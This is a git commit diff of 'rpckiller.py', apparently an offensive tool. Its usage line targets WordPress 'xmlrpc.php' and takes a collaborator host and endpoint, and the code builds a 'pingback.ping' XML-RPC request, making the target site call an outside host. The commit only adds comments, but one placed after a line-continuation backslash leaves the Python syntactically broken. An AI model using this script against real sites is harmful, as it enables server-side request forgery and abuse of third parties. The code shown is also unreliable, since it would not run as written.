3befbdb7270eb79403c9ec085e3dbb70b83c6654
Ashish Kunwar <dorkerdevil280@gmail.com>
2021-11-11 20:55:52 +0530

    Update rpckiller.py

--- rpckiller.py
+++ rpckiller.py
@@ -25,15 +25,15 @@ print ("""
 USAGE - http(s)://target/xmlrpc.php collab.net/localhost:port '/endpoint/'
 """)
 
-
-def main():
+#defining a main function with 3 arguments 
+def main(): 
     target = sys.argv[1]
     collab = sys.argv[2]
     endpoint = sys.argv[3]
-    if len(sys.argv) >= 3:
+    if len(sys.argv) >= 3:  #argument condition 
         try:
             base_url = \
-                '{0.scheme}://{0.netloc}/'.format(urlsplit(target))
+                '{0.scheme}://{0.netloc}/'.format(urlsplit(target)) #seperates the protocol and domain from the input.
             target_headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -45,7 +45,7 @@ def main():
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Connection': 'close',
                 }
-            target_data = \
+            target_data = \ #post data in xml
                 '''<?xml version="1.0" encoding="UTF-8"?>\r
 <methodCall>\r
 <methodName>pingback.ping</methodName>\r
